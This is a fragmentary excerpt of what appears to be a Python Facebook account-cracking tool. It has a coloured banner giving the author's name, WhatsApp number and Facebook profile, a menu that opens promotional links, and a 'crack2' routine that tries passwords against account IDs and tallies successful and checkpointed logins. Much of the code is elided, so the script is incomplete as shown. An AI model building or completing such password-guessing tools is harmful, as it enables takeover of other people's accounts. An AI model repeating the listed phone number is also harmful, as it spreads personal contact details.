...
\x1b[93;1m Author       \x1b[92;1m=>      \x1b[93;1mADIL TOOR 

\x1b[93;1m Whatsapp     \x1b[92;1m=>      \x1b[93;1m+923246950538

\x1b[93;1m Facebook       \x1b[92;1m=>      \x1b[93;1mADIL TARIQ TOOR 
...
def menu(): #Bilo
	...
	if farhan in ['1','01']:
		...
		os.system("xdg-open https://youtu.be/u_jBloc2U5Q")

		exit()

	else:

		os.system("https://www.facebook.com/profile.php?id=100086738192739")
...
def crack2(idf,pwv):
	...
	print('\r%s [ADIL] %s/%s  OK*%s | CP*%s => %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "www.facebook.com" in resp.json()["error_msg"]:
				...
				if 'ya' in oprek:
					...
					print('\r%s [ADIL-CP ☹️ ] %s|%s        '%(b,idf,pw))
